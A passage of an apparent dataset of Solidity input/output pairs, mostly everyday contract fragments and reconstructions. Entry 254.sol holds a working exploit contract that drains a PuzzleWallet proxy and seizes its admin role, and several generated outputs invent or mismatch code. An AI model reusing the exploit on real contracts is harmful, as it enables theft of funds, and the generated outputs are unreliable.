        "output": "pragma solidity ^0.8.9;\ncontract Staking {\n    struct Stakes {\n        uint amount;\n        uint timestamp;\n    }\n\n    mapping (address => Stakes[]) public addressToStaked;\n\n    function stakeTokens(uint _amount) public {\n        Stakes memory newStake = Stakes(_amount, block.timestamp);\n        addressToStaked[msg.sender].push(newStake);\n    }\n\n    function returnStaked (address addressStaked) public view returns (Stakes[] memory) {\n       return addressToStaked[addressStaked];\n    }\n}\n\n",
        "changed": 1
    },
    "248.sol": {
        "input": "function changeAuctionEndTime(uint extraTimeAmount) public {\n    require(msg.sender == contractOwner, \"ONLY THE CONTRACT's OWNER CAN CALL THIS FUNCTION!\");  \n    auctionEndTime += extraTimeAmount * 1 minutes;  \n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Auction {\n    address public contractOwner;\n    uint public auctionEndTime;\n\n    constructor() public {\n        contractOwner = msg.sender;\n        auctionEndTime = block.timestamp;\n    }\n\n    function changeAuctionEndTime(uint extraTimeAmount) public {\n        require(msg.sender == contractOwner, \"ONLY THE CONTRACT's OWNER CAN CALL THIS FUNCTION!\");\n        auctionEndTime += extraTimeAmount * 1 minutes;\n    }\n\n    function getEndTime() public view returns (uint) {\n        return auctionEndTime;\n    }\n}\n\n",
        "changed": 1
    },
    "249.sol": {
        "input": "   function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {\n        (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n        TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n        TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n        liquidity = IUniswapV2Pair(pair).mint(to);\n    }\n\nIUniswapV2Pair(pair).mint(to)\n\n_mint(to, liquidity);\n\n\n",
        "output": "",
        "changed": 0
    },
    "251.sol": {
        "input": "constructor(uint256 initialSupply) ERC20 (\"MAstering ther\",\"MET\")\n{\n    _mint(msg.sender, initialSupply);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "252.sol": {
        "input": "pragma solidity ^0.8.16;\ncontract todo\n{\n   struct llist\n   {  \n       uint no ;         \n       string cont ;        \n       address own ;         \n       bool iscom ;            \n       uint ttim ;              \n   }\n    uint public i ; \n    mapping ( address => uint) public num ;        \n    mapping ( address => llist[]) public num2 ;   \n    function real( string memory _contect) public\n    {\n        if (  num[msg.sender] > 98)\n\n        {\n            i = 8 ;\n        }\n\n        else\n        {\n       num2[msg.sender].push( llist(num[msg.sender] , \n         _contect,payable(msg.sender),false,block.timestamp));    \n                  num[msg.sender]++ ;\n        }\n     }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Todo {\n   struct Llist {  \n       uint no;         \n       string cont;        \n       address own;         \n       bool iscom;            \n       uint ttim;              \n   }\n\n   uint public i; \n   mapping (address => uint) public num;       \n   mapping (address => Llist[]) public num2;   \n\n   function real(string memory _contect) public {\n        if (num[msg.sender] > 98) {\n            i = 8;\n        } else {\n            num2[msg.sender].push(Llist(num[msg.sender], _contect, payable(msg.sender), false, block.timestamp));    \n            num[msg.sender]++;\n        }\n     }\n\n    function getTask(address _address, uint _index) public view returns (uint, string memory, address, bool, uint) {\n        Llist storage task = num2[_address][_index];\n        return (task.no, task.cont, task.own, task.iscom, task.ttim);\n    }\n}\n\n",
        "changed": 0
    },
    "254.sol": {
        "input": "pragma solidity ^0.6.0;\npragma experimental ABIEncoderV2;\n\nimport \"./PuzzleWallet.sol\";\n\ncontract Exploit{\n    PuzzleProxy public proxy;\n\n    constructor(PuzzleProxy _proxy) public payable{\n        require(msg.value == 0.001 ether, \"incorrect msg.value\");\n        proxy = _proxy;\n        proxy.proposeNewAdmin(address(this));\n\n        PuzzleWallet wallet = PuzzleWallet(address(proxy));\n        wallet.addToWhitelist(address(this));\n     \n        bytes memory data = abi.encodeWithSelector(PuzzleWallet.deposit.selector);\n\n        bytes[] memory data1 = new bytes[](1);\n        data1[0] = data;\n\n        bytes memory data2 = abi.encodeWithSelector(PuzzleWallet.multicall.selector, data1);\n\n        bytes[] memory data3 = new bytes[](2);\n        data3[0] = data2;\n        data3[1] = data2;\n        \n\n        wallet.multicall{value:0.001 ether}(data3);  \n        uint256 balance  = wallet.balances(address(this));\n        require(balance == 0.002 ether, \"unexpected balance\");\n\n        wallet.execute(msg.sender, balance, new bytes(0));\n        wallet.setMaxBalance(uint256(uint160(address(this))));\n\n        require(proxy.admin() == address(this), \"fail to exploit\");\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PuzzleWallet {\n    function deposit() public payable {}\n    function multicall(bytes[] memory) public payable {}\n    function addToWhitelist(address) public {}\n    function balances(address) public view returns(uint256) {}\n    function execute(address, uint256, bytes memory) public {}\n    function setMaxBalance(uint256) public {}\n}\n\ncontract PuzzleProxy {\n    function proposeNewAdmin(address) public {}\n    function admin() public view returns(address) {}\n}\n",
        "changed": 1
    },
    "255.sol": {
        "input": "contract SelfWhitelist {\n\n    mapping(address => bool) public addressWhitelist;\n\n    function whitelist() public returns(string memory) {\n        if (check()) {\n            return \"Already whitelisted!\";\n        }\n        addressWhitelist[msg.sender] = true;\n        return \"Whitelisted!\";\n    }\n\n    function check() public view returns (bool) {\n\n        return addressWhitelist[msg.sender];\n    }\n}\n\n for(uint i = 0; i < addressWhitelist.length; i++) {\n    if(addressWhitelist[i] != msg.sender) {\n        addressWhitelist.push(msg.sender);\n        return \"Whitelisted!\";\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SelfWhitelist {\n\n    mapping(address => bool) public addressWhitelist;\n\n    function whitelist() public returns(string memory) {\n        if (check()) {\n            return \"Already whitelisted!\";\n        }\n        addressWhitelist[msg.sender] = true;\n        return \"Whitelisted!\";\n    }\n\n    function check() public view returns (bool) {\n        return addressWhitelist[msg.sender];\n    }\n}\n\n",
        "changed": 1
    },
    "256.sol": {
        "input": "const bytesHex = web3.eth.abi.encodeParameters(\n    ['address', 'uint256'],\n    ['0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe', '1']\n);\n\npragma solidity ^0.8;\n\ncontract MyContract {\n    function foo2(address param1, uint256 param2) external {\n    }\n    \n    function foo1(bytes memory params) external {\n        (address decodedAddress, uint256 decodedUint) = abi.decode(params, (address, uint256));\n        this.foo2(decodedAddress, decodedUint);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function foo2(address param1, uint256 param2) external {\n        // logic of function foo2\n    }\n    \n    function foo1(bytes memory params) external {\n        (address decodedAddress, uint256 decodedUint) = abi.decode(params, (address, uint256));\n        this.foo2(decodedAddress, decodedUint);\n    }\n}\n\n",
        "changed": 0
    },
    "257.sol": {
        "input": "interface IERC20 {\n   function transfer(address _to, uint256 _value) external returns (bool);\n   function balanceOf(address account) external view returns (uint);\n}\n\nIERC20 usdt = IERC20(address(\"token smart contract address in hex format\"));\n\nuint256 usdtBalance = usdt.balanceOf('your wallet address in hex format');\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address _to, uint256 _value) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract MyContract {\n    IERC20 public usdt;\n\n    constructor(address _tokenAddress) public {\n        usdt = IERC20(_tokenAddress);\n    }\n\n    function checkBalance(address _walletAddress) public view returns (uint256) {\n        uint256 usdtBalance = usdt.balanceOf(_walletAddress);\n        return usdtBalance;\n    }\n}\n\n",
        "changed": 0
    },
    "258.sol": {
        "input": "function changeMap() external {\n  require(msg.sender == _contractBAddress, 'address not match');\n}\n\nmodifier onlyContractB {\n        require(\n            msg.sender == _contractBAddress,\n            \"Only contractB can call this function.\"\n        );\n        _;\n    }\n\nfunction changeMap() onlyContractB {\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address private _contractBAddress;\n\n    constructor(address contractBAddress) public {\n        _contractBAddress = contractBAddress;\n    }\n\n    function changeMap() external onlyContractB {\n        // your code here\n    }\n\n    modifier onlyContractB {\n        require(\n            msg.sender == _contractBAddress,\n            \"Only contractB can call this function.\"\n        );\n        _;\n    }\n}\n\n",
        "changed": 0
    },
    "259.sol": {
        "input": "pragma solidity >=0.4.22 <0.8.11;\n\ncontract Serializer {\n\n    function hexStringToIntArray(string memory s) public pure returns (uint64[] memory) {\n        uint size = bytes(s).length / 16;\n        uint64[] memory result = new uint64[](size);\n        for (uint i = 0; i< size; i++) {\n            string memory strSlice = getSlice(i*16, (i+1)*16, s);\n            result[i] = hexStringToInt(strSlice);\n        }\n        return result;\n    }\n\n    function getSlice(uint startIndex, uint endIndex, string memory str) public pure returns (string memory) {\n        bytes memory strBytes = bytes(str);\n        bytes memory result = new bytes(endIndex-startIndex);\n        for(uint i = startIndex; i < endIndex; i++) {\n            result[i-startIndex] = strBytes[i];\n        }\n        return string(result);\n    }\n\n    function hexBytesToInt(bytes memory ss) public pure returns (uint64){\n        uint64 val = 0;\n        uint8 a = uint8(97); \n        uint8 zero = uint8(48); \n        uint8 nine = uint8(57); \n        uint8 A = uint8(65); \n        uint8 F = uint8(70); \n        uint8 f = uint8(102); \n        for (uint i=0; i<ss.length; ++i) {\n            uint8 byt = uint8(ss[i]);\n            if (byt >= zero && byt <= nine) byt = byt - zero;\n            else if (byt >= a && byt <= f) byt = byt - a + 10;\n            else if (byt >= A && byt <= F) byt = byt - A + 10;\n            val = (val << 4) | (byt & 0xF);\n        }\n        return val;\n    }\n\n    function hexStringToInt(string memory s) public pure returns (uint64) {\n        bytes memory ss = bytes(s);\n        uint64 val = hexBytesToInt(ss);\n        return val;\n    }\n}\n\nconst Serializer = artifacts.require(\"Serializer\");\nconst truffleAssert = require(\"truffle-assertions\");\nconst fs = require(\"fs\");\nconst { readLines } = require(\"./utils.js\");\nconst BN = web3.utils.BN;\n\ncontract(\"Serializer\", (accounts) => {\n  const [deployerAddress, tokenHolderOneAddress, tokenHolderTwoAddress] = accounts;\n\n  it(\"hexStringToInt\", async () => {\n    let s = await Serializer.deployed();\n    let result = await s.hexStringToInt.call(\"08bbe0e25e412fff\");\n    let expected = new BN(\"629343835796877311\");\n    assert.equal(result.toString(10), expected.toString(10));\n    result = await s.hexStringToInt.call(\"08bbe0e25e4a0fff\");\n    expected = new BN(\"629343835797458943\");\n    assert.equal(result.toString(10), expected.toString(10));\n    result = await s.hexStringToInt.call(\"08bbe0e25e4a3fff\");\n    expected = new BN(\"629343835797471231\");\n    assert.equal(result.toString(10), expected.toString(10));\n  });\n  it(\"getSlice1\", async () => {\n    let s = await Serializer.deployed();\n    let result = await s.getSlice.call(0, 16, \"08bbe0e25e412fff08bbe0e25e4a0fff08bbe0e25e4a3fff\");\n    let expected = \"08bbe0e25e412fff\";\n    assert.equal(result, expected);\n  });\n  it(\"getSlice2\", async () => {\n    let s = await Serializer.deployed();\n    const result = await s.getSlice.call(16, 32, \"08bbe0e25e412fff08bbe0e25e4a0fff08bbe0e25e4a3fff\");\n    const expected = \"08bbe0e25e4a0fff\";\n    assert.equal(result, expected);\n  });\n  it(\"getSlice3\", async () => {\n    let s = await Serializer.deployed();\n    const result = await s.getSlice.call(32, 48, \"08bbe0e25e412fff08bbe0e25e4a0fff08bbe0e25e4a3fff\");\n    const expected = \"08bbe0e25e4a3fff\";\n    assert.equal(result, expected);\n  });\n  it(\"hexStringToIntArray\", async () => {\n    let s = await Serializer.deployed();\n    let result = await s.hexStringToIntArray.call(\"08bbe0e25e412fff08bbe0e25e4a0fff08bbe0e25e4a3fff\");\n    console.log(result);\n    let expected = [\n      new BN(\"629343835796877311\").toString(),\n      new BN(\"629343835797458943\").toString(),\n      new BN(\"629343835797471231\").toString(),\n    ];\n    const resultS = result.map((x) => x.toString());\n    assert.deepEqual(resultS, expected);\n  });\n});\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Serializer {\n\n    function hexStringToIntArray(string memory s) public pure returns (uint64[] memory) {\n        uint size = bytes(s).length / 16;\n        uint64[] memory result = new uint64[](size);\n        for (uint i = 0; i < size; i++) {\n            string memory strSlice = getSlice(i*16, (i+1)*16, s);\n            result[i] = hexStringToInt(strSlice);\n        }\n        return result;\n    }\n\n    function getSlice(uint startIndex, uint endIndex, string memory str) public pure returns (string memory) {\n        bytes memory strBytes = bytes(str);\n        bytes memory result = new bytes(endIndex-startIndex);\n        for(uint i = startIndex; i < endIndex; i++) {\n            result[i-startIndex] = strBytes[i];\n        }\n        return string(result);\n    }\n\n    function hexBytesToInt(bytes memory ss) public pure returns (uint64){\n        uint64 val = 0;\n        uint8 a = uint8(97); \n        uint8 zero = uint8(48); \n        uint8 nine = uint8(57); \n        uint8 A = uint8(65); \n        uint8 F = uint8(70); \n        uint8 f = uint8(102); \n        for (uint i=0; i<ss.length; ++i) {\n            uint8 byt = uint8(ss[i]);\n            if (byt >= zero && byt <= nine) byt = byt - zero;\n            else if (byt >= a && byt <= f) byt = byt - a + 10;\n            else if (byt >= A && byt <= F) byt = byt - A + 10;\n            val = (val << 4) | (byt & 0xF);\n        }\n        return val;\n    }\n\n    function hexStringToInt(string memory s) public pure returns (uint64) {\n        bytes memory ss = bytes(s);\n        uint64 val = hexBytesToInt(ss);\n        return val;\n    }\n}\n\n",
        "changed": 0
    },
    "260.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract Test {\n    uint256[] public threshold = [21000, 2000, 3000];\n\n    function setThreshold(uint256[] memory _threshold) public {\n        threshold = _threshold;\n    }\n}\n\ndef main():\n    check = Test.deploy({\"from\": accounts[0]})\n    print(check.threshold(0))\n    check.setThreshold([1000, 1000, 1000], {\"from\": accounts[0]})\n    print(check.threshold(0))\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n    uint256[] public threshold = [21000, 2000, 3000];\n\n    function setThreshold(uint256[] memory _threshold) public {\n        threshold = _threshold;\n    }\n}\n\n",
        "changed": 0
    },
    "261.sol": {
        "input": "contract FunWithStorage {\n    uint256 public favoriteNumber = 20; \n\n    string private test = \"hello1adsfdsfds\"; \n    bool public someBool = false; \n\n\n    uint256[] public myArray; \n}\n\nlet ARRAY_SLOT = 3;\n\nlet ITEM_SLOT = 0;\n\nlet length = BigInt(await getStorageAt(ARRAY_SLOT));\n\nlet location = BigInt(keccak256(encodePacked(ARRAY_SLOT))) + BigInt(ITEM_SLOT);\nlet memory = await getStorageAt(location);\n\ncontract Foo {\n    type User { \n        address owner;\n        uint balance;\n    }\n    User[] users;\n}\n\nlet ITEM_SLOT = ARRAY_ITEM_INDEX * ITEM_SIZE + ITEM_INDEX\nlet ITEM_SLOT = 3 * 2 + 1;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract FunWithStorage {\n    uint256 public favoriteNumber = 20; \n    string private test = \"hello1adsfdsfds\"; \n    bool public someBool = false; \n    uint256[] public myArray; \n\n    function setFavoriteNumber(uint256 _favoriteNumber) public {\n        favoriteNumber = _favoriteNumber;\n    }\n\n    function setTest(string memory _test) public {\n        test = _test;\n    }\n\n    function setSomeBool(bool _someBool) public {\n        someBool = _someBool;\n    }\n\n    function addToMyArray(uint256 value) public {\n        myArray.push(value);\n    }\n}\n\ncontract Foo {\n    struct User {\n        address owner;\n        uint balance;\n    }\n    \n    User[] public users;\n\n    function addUser(address _owner, uint _balance) public {\n        User memory newUser = User({\n            owner: _owner,\n            balance: _balance\n        });\n\n        users.push(newUser);\n    }\n}\n\n",
        "changed": 0
    },
    "262.sol": {
        "input": "contract Test {\n    uint public blockNumber;\n    bytes32 public blockHashNow;\n    bytes32 public blockHashPrevious;\n\n    function setValues() {\n        blockNumber = block.number;\n        blockHashNow = block.blockhash(blockNumber);\n        blockHashPrevious = block.blockhash(blockNumber - 1);\n    }    \n}\n\n\n",
        "output": "contract Test {\n    uint public blockNumber;\n    bytes32 public blockHashNow;\n    bytes32 public blockHashPrevious;\n\n    function setValues() {\n        blockNumber = block.number;\n        blockHashNow = block.blockhash(blockNumber);\n        blockHashPrevious = block.blockhash(blockNumber - 1);\n    }    \n}\n\n",
        "changed": 0
    },
    "263.sol": {
        "input": "function getPlayers() public view returns (uint) {\n        return players.length;\n    }\n\nfunction getPlayers() public view returns (address payable[] memory ) {\n        return players;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PlayerContract {\n    address payable[] public players;\n    \n    function addPlayer(address payable player) public {\n        players.push(player);\n    }\n\n    function getPlayersCount() public view returns (uint) {\n        return players.length;\n    }\n\n    function getPlayersAddress() public view returns (address payable[] memory) {\n        return players;\n    }\n}\n\n",
        "changed": 0
    },
    "264.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract StringToAddress {\n\nfunction stringToAddress(string memory _address) public pure returns (address) {\n    string memory cleanAddress = remove0xPrefix(_address);\n    bytes20 _addressBytes = parseHexStringToBytes20(cleanAddress);\n    return address(_addressBytes);\n}\n\nfunction remove0xPrefix(string memory _hexString) internal pure returns (string memory) {\n    if (bytes(_hexString).length >= 2 && bytes(_hexString)[0] == '0' && (bytes(_hexString)[1] == 'x' || bytes(_hexString)[1] == 'X')) {\n        return substring(_hexString, 2, bytes(_hexString).length);\n    }\n    return _hexString;\n}\n\nfunction substring(string memory _str, uint256 _start, uint256 _end) internal pure returns (string memory) {\n    bytes memory _strBytes = bytes(_str);\n    bytes memory _result = new bytes(_end - _start);\n    for (uint256 i = _start; i < _end; i++) {\n        _result[i - _start] = _strBytes[i];\n    }\n    return string(_result);\n}\n\nfunction parseHexStringToBytes20(string memory _hexString) internal pure returns (bytes20) {\n    bytes memory _bytesString = bytes(_hexString);\n    uint160 _parsedBytes = 0;\n    for (uint256 i = 0; i < _bytesString.length; i += 2) {\n        _parsedBytes *= 256;\n        uint8 _byteValue = parseByteToUint8(_bytesString[i]);\n        _byteValue *= 16;\n        _byteValue += parseByteToUint8(_bytesString[i + 1]);\n        _parsedBytes += _byteValue;\n    }\n    return bytes20(_parsedBytes);\n}\n\nfunction parseByteToUint8(bytes1 _byte) internal pure returns (uint8) {\n    if (uint8(_byte) >= 48 && uint8(_byte) <= 57) {\n        return uint8(_byte) - 48;\n    } else if (uint8(_byte) >= 65 && uint8(_byte) <= 70) {\n        return uint8(_byte) - 55;\n    } else if (uint8(_byte) >= 97 && uint8(_byte) <= 102) {\n        return uint8(_byte) - 87;\n    } else {\n        revert(string(abi.encodePacked(\"Invalid byte value: \", _byte)));\n    }\n}\n}\n\n\n",
        "output": "pragma solidity ^0.8.0;\n\ncontract StringToAddress {\n\nfunction stringToAddress(string memory _address) public pure returns (address) {\n    string memory cleanAddress = remove0xPrefix(_address);\n    bytes20 _addressBytes = parseHexStringToBytes20(cleanAddress);\n    return address(_addressBytes);\n}\n\nfunction remove0xPrefix(string memory _hexString) internal pure returns (string memory) {\n    if (bytes(_hexString).length >= 2 && bytes(_hexString)[0] == '0' && (bytes(_hexString)[1] == 'x' || bytes(_hexString)[1] == 'X')) {\n        return substring(_hexString, 2, bytes(_hexString).length);\n    }\n    return _hexString;\n}\n\nfunction substring(string memory _str, uint256 _start, uint256 _end) internal pure returns (string memory) {\n    bytes memory _strBytes = bytes(_str);\n    bytes memory _result = new bytes(_end - _start);\n    for (uint256 i = _start; i < _end; i++) {\n        _result[i - _start] = _strBytes[i];\n    }\n    return string(_result);\n}\n\nfunction parseHexStringToBytes20(string memory _hexString) internal pure returns (bytes20) {\n    bytes memory _bytesString = bytes(_hexString);\n    uint160 _parsedBytes = 0;\n    for (uint256 i = 0; i < _bytesString.length; i += 2) {\n        _parsedBytes *= 256;\n        uint8 _byteValue = parseByteToUint8(_bytesString[i]);\n        _byteValue *= 16;\n        _byteValue += parseByteToUint8(_bytesString[i + 1]);\n        _parsedBytes += _byteValue;\n    }\n    return bytes20(_parsedBytes);\n}\n\nfunction parseByteToUint8(bytes1 _byte) internal pure returns (uint8) {\n    if (uint8(_byte) >= 48 && uint8(_byte) <= 57) {\n        return uint8(_byte) - 48;\n    } else if (uint8(_byte) >= 65 && uint8(_byte) <= 70) {\n        return uint8(_byte) - 55;\n    } else if (uint8(_byte) >= 97 && uint8(_byte) <= 102) {\n        return uint8(_byte) - 87;\n    } else {\n        revert(string(abi.encodePacked(\"Invalid byte value: \", _byte)));\n    }\n}\n}\n\n",
        "changed": 0
    },
    "265.sol": {
        "input": "function sfStore(uint256 _simpleStorageIndex, uint256 _simpleStorageNumber) public {\n    SimpleStorage simpleStorage = SimpleStorage(address(simpleStorageArray[_simpleStorageIndex]));\n    simpleStorage.store(_simpleStorageNumber);\n} \n} \n\nfunction sfStore(uint256 _simpleStorageIndex, uint256 _simpleStorageNumber) public {\n  SimpleStorage simpleStorage = \n  SimpleStorage(address(simpleStorageArray[_simpleStorageIndex]));\n  simpleStorage.store(_simpleStorageNumber);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    uint public storedData;\n    function store(uint x) public {\n        storedData = x;\n    }\n}\n\ncontract MyContract {\n    address[] public simpleStorageArray;\n\n    function addSimpleStorage(address _simpleStorageAddress) public {\n        simpleStorageArray.push(_simpleStorageAddress);\n    }\n\n    function sfStore(uint256 _simpleStorageIndex, uint256 _simpleStorageNumber) public {\n        SimpleStorage simpleStorage = SimpleStorage(address(simpleStorageArray[_simpleStorageIndex]));\n        simpleStorage.store(_simpleStorageNumber);\n    }\n}\n\n",
        "changed": 0
    },
    "266.sol": {
        "input": "\npragma solidity 0.8.7;\ncontract A {\n    function foo() public pure virtual returns (string memory) {\n           return \"Foo Contract A\";\n    }\n\n    function bar() public pure returns (string memory) {\n          return \"Bar Contract A\";\n    }\ncontract B is A {\n    function foo() public pure override returns (string memory) {\n         return \"Foo Contract B\";\n    }\n}\n\ncontract B is A {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract A {\n    function foo() public pure virtual returns (string memory) {\n        return \"Foo Contract A\";\n    }\n\n    function bar() public pure returns (string memory) {\n        return \"Bar Contract A\";\n    }\n}\n\n",
        "changed": 0
    },
    "267.sol": {
        "input": "function setPoint(SampleInterface.Point memory point) external {\n    SampleInterface(sample).setPoint(point);\n}\n\nfunction getPoint() external view returns(SampleInterface.Point memory) {\n    return SampleInterface(sample).getPoint();\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface SampleInterface {\n    struct Point {\n        uint x;\n        uint y;\n    }\n    function setPoint(Point memory point) external;\n    function getPoint() external view returns (Point memory);\n}\n\ncontract SampleContract {\n    SampleInterface private sample;\n\n    constructor(address _sample) {\n        sample = SampleInterface(_sample);\n    }\n\n    function setPoint(SampleInterface.Point memory point) external {\n        sample.setPoint(point);\n    }\n\n    function getPoint() external view returns(SampleInterface.Point memory) {\n        return sample.getPoint();\n    }\n}\n\n",
        "changed": 0
    },
    "268.sol": {
        "input": "require(msg.value >= mintPrice, \"Not enough ETH sent; check price!\"); \n\nconst transation = await contract.safeMint(userAccount, {\n    value: 1\n});\n\n\n",
        "output": "",
        "changed": 0
    },
    "269.sol": {
        "input": "pragma solidity >=0.6.0 <0.9.0;\n\ncontract SimpleStorage {\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    uint storedData;\n\n    function set(uint x) public {\n        storedData = x;\n    }\n\n    function get() public view returns (uint) {\n        return storedData;\n    }\n}\n\n",
        "changed": 0
    },
    "270.sol": {
        "input": "function onERC721received(address, address _from, uint256 _tokenID) public returns (bytes4) {\n    emit Received(msg.sender, _sender, _tokenID) \n    return this.onERC721Received.selector;\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface ERC721TokenReceiver {\n    function onERC721Received(address operator, address from, uint256 tokenId, bytes memory data) public returns(bytes4);\n}\n\n",
        "changed": 0
    },
    "271.sol": {
        "input": "function getNumber() public view returns (uint256, bool) {\n    return (number, false);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NumberContract {\n    uint256 private number;\n\n    constructor(uint256 initialNumber) public {\n        number = initialNumber;\n    }\n\n    function setNumber(uint256 newNumber) public {\n        number = newNumber;\n    }\n\n    function getNumber() public view returns (uint256, bool) {\n        return (number, false);\n    }\n}\n\n",
        "changed": 0
    },
    "273.sol": {
        "input": "pragma solidity >=0.7.0 <0.9.0;\n\ncontract Test {\n\n     function testTransfer() external payable {}\n     function getBalance() external view returns (uint256) {\n       return address(this).balance;\n     }\n}\n\n\n",
        "output": "pragma solidity >=0.7.0 <0.9.0;\n\ncontract Test {\n\n     function testTransfer() external payable {}\n     function getBalance() external view returns (uint256) {\n       return address(this).balance;\n     }\n}\n\n",
        "changed": 0
    },
    "275.sol": {
        "input": "pragma solidity >=0.5.0 < 0.9.0\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    string public contractName;\n\n    constructor() public {\n        contractName = \"My Smart Contract\";\n    }\n\n    function setContractName(string memory newContractName) public {\n        contractName = newContractName;\n    }\n\n    function getContractName() public view returns(string memory) {\n        return contractName;\n    }\n}\n\n",
        "changed": 0
    },
    "276.sol": {
        "input": "_totalSupply = 1000000000000 * 1e18;\n\n_totalSupply = 1000000000000 * (10 ** decimals);\n\n_totalSupply = 1000000000000 ether;\n\n_totalSupply = 1000000000000 * 1e18;\n\naddress[3] memory devs = [address(0x123), address(0x456), address(0x789)];\naddress dapp = address(0xabc);\naddress exchange = address(0xdef);\n\nuint256 totalSupplyRemaining = _totalSupply;\n\nuint256 devBalance = _totalSupply / 100;\nfor (uint i = 0; i < 3; i++) {\n    balances[devs[i]] = devBalance;\n    emit Transfer(address(0x0), devs[i], devBalance);\n    totalSupplyRemaining -= devBalance;\n}\n\nuint256 dappBalance = _totalSupply / 2;\nbalances[dapp] = dappBalance;\nemit Transfer(address(0x0), dapp, dappBalance);\ntotalSupplyRemaining -= dappBalance;\n\nbalances[exchange] = totalSupplyRemaining;\nemit Transfer(address(0x0), exchange, totalSupplyRemaining);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    mapping(address => uint256) public balances;\n    uint8 public decimals = 18;\n    uint256 private _totalSupply;\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor() public {\n        _totalSupply = 1000000000000 * uint256(10) ** decimals;\n\n        address[3] memory devs = [\n            address(0x123),\n            address(0x456),\n            address(0x789)\n        ];\n        address dapp = address(0xabc);\n        address exchange = address(0xdef);\n\n        uint256 totalSupplyRemaining = _totalSupply;\n\n        uint256 devBalance = _totalSupply / 100;\n        for (uint i = 0; i < 3; i++) {\n            balances[devs[i]] = devBalance;\n            emit Transfer(address(0), devs[i], devBalance);\n            totalSupplyRemaining -= devBalance;\n        }\n\n        uint256 dappBalance = _totalSupply / 2;\n        balances[dapp] = dappBalance;\n        emit Transfer(address(0), dapp, dappBalance);\n        totalSupplyRemaining -= dappBalance;\n\n        balances[exchange] = totalSupplyRemaining;\n        emit Transfer(address(0), exchange, totalSupplyRemaining);\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address tokenOwner) public view returns (uint256) {\n        return balances[tokenOwner];\n    }\n}\n\n",
        "changed": 0
    },
    "277.sol": {
        "input": "zombies.push(\n    Zombie(...) \n)\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ZombieFactory {\n\n    event NewZombie(uint zombieId, string name, uint dna);\n\n    uint dnaDigits = 16;\n    uint dnaModulus = 10 ** dnaDigits;\n\n    struct Zombie {\n        string name;\n        uint dna;\n    }\n\n    Zombie[] public zombies;\n\n    function _createZombie(string memory _name, uint _dna) private {\n        uint id = zombies.push(Zombie(_name, _dna)) - 1;\n        emit NewZombie(id, _name, _dna);\n    }\n\n    function _generateRandomDna(string memory _str) private view returns (uint) {\n        uint rand = uint(keccak256(abi.encodePacked(_str)));\n        return rand % dnaModulus;\n    }\n\n    function createRandomZombie(string memory _name) public {\n        uint randDna = _generateRandomDna(_name);\n        _createZombie(_name, randDna);\n    }\n}\n\n",
        "changed": 0
    },
    "278.sol": {
        "input": "pragma solidity ^0.8.10;\n\nimport \"openzeppelin-solidity/contracts/token/ERC20/ERC20.sol\";\nimport \"openzeppelin-solidity/contracts/token/ERC20/extensions/ERC20Burnable.sol\";\nimport \"openzeppelin-solidity/contracts/token/ERC20/extensions/ERC20Pausable.sol\";\nimport \"openzeppelin-solidity/contracts/token/ERC20/extensions/ERC20Capped.sol\";\nimport \"openzeppelin-solidity/contracts/access/Ownable.sol\";\n\n\n\n contract MyToken is ERC20, Ownable, ERC20Burnable, ERC20Pausable,ERC20Capped {\n    constructor () ERC20 (\"FlashToken\", \"FLT\") ERC20Capped(1000000000 * (10**uint256(18)))\n    {\n        _mint(msg.sender,1000000000 * (10**uint256(18)));\n    \n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "279.sol": {
        "input": "IERC20 tokennew = IERC20(address(tokenContractAddress));\ntokennew.safeTransferFrom(msg.sender, to, amount);\n\n\n",
        "output": "",
        "changed": 0
    },
    "281.sol": {
